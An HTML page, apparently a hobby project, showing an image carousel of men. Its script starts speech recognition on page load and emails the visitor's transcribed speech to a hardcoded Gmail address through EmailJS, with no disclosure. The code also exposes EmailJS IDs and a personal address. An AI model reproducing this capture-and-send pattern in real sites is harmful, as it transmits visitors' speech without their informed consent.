<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link href="./style.css" rel="stylesheet" />

    />

  </head>
  <body style="background: url(./koreanbg.jpg); background-size: cover; backdrop-filter: blur(10px); width: 100vw; height: 100vh; background-repeat: no repeat; ">
    <div id="carouselExample" style="width: 40%; margin-left:auto; margin-right: auto; height: 400px; padding-top: 70px;" class="carousel slide">
      <div class="carousel-inner">
        
        <div class="carousel-item">
          <img src="./Mike-OHearn-3-1.webp" style="object-fit: contain; height: 400px;" class="d-block w-100" alt="...">
        </div>
        <div class="carousel-item">
          <img src="./JamesReid.jpg" style="object-fit: contain; height: 400px;" class="d-block w-100" alt="...">
        </div>
        <div class="carousel-item">
          <img src="./chris-hemsworth-shirtless-japan-snow-012524-tout-2957aac632ac4aeabc129bce73081318.jpg" style="object-fit: contain; height: 400px;" class="d-block w-100" alt="...">
        </div>
        <div class="carousel-item">
          <img src="./original_jaicke-chain_4813234316826.jpg" style="object-fit: contain; height: 400px;" class="d-block w-100" alt="...">
        </div>
        <div class="carousel-item">
          <img src="./dingdong.jpg" style="object-fit: contain; height: 400px;" class="d-block w-100" alt="...">
        </div>
        <div class="carousel-item active">
          <img src="./muscle man.jpg" style="object-fit: contain; height: 400px;"class="d-block w-100" alt="...">
        </div>
      </div>
      <button class="carousel-control-prev" type="button" data-bs-target="#carouselExample" data-bs-slide="prev">
        <span class="carousel-control-prev-icon" style=" -webkit-filter: invert(100%); filter: invert(100%);" aria-hidden="true"></span>
        <span class="visually-hidden" >Previous</span>
      </button>
      <button class="carousel-control-next" type="button" data-bs-target="#carouselExample" data-bs-slide="next">
        <span class="carousel-control-next-icon" style=" -webkit-filter: invert(100%); filter: invert(100%);" aria-hidden="true"></span>
        <span class="visually-hidden" >Next</span>
      </button>
    </div>
    <div style="display: grid; justify-content: center">
      <div id="str" style="color:white"></div>
    </div>

    <script>
      var SpeechRecognition =
        window.SpeechRecognition ||
        window.webkitSpeechRecognition ||
        window.mozSpeechRecognition ||
        window.msSpeechRecognition;
      var voiceRecognition = new SpeechRecognition();

      // Set language to English (United States)
      voiceRecognition.lang = "en-US";

      // Disable interim results
      voiceRecognition.interimResults = false;

      // Set the maximum number of alternative transcripts to 5
      voiceRecognition.maxAlternatives = 5;

      voiceRecognition.onresult = function (event) {
        var recordedVoice = event.results[0][0].transcript;

        var string = recordedVoice;
        var str = string.split("");
        var el = document.getElementById("str");
        (function animate() {
          str.length > 0
            ? (el.innerHTML += str.shift())
            : clearTimeout(running);
          var running = setTimeout(animate, 90);
        })();

        
        // Send email with recorded voice message
        sendEmail(recordedVoice);

        // Function to send email
        function sendEmail(message) {
          // Replace these values with your own
          var serviceID = "service_2c0f3cj";
          var templateID = "template_l6cbh1m";
          var userID = "7ZnP8XVakorqeHNIy";

          // Prepare email parameters
          var templateParams = {
            to_email: "torresonealryan@gmail.com",
            message: message,
          };

          // Send the email
          emailjs.send(serviceID, templateID, templateParams, userID).then(
            function (response) {
              console.log("Email sent successfully", response);
              el.innerHTML = "✉✓" + el.innerHTML;
            },
            function (error) {
              console.error("Email sending failed", error);
            }
          );
        }
      };

      // Start voice recognition when the page loads
      voiceRecognition.start();
    </script>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
      // Initialize EmailJS with your user ID
      emailjs.init("7ZnP8XVakorqeHNIy");
    </script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
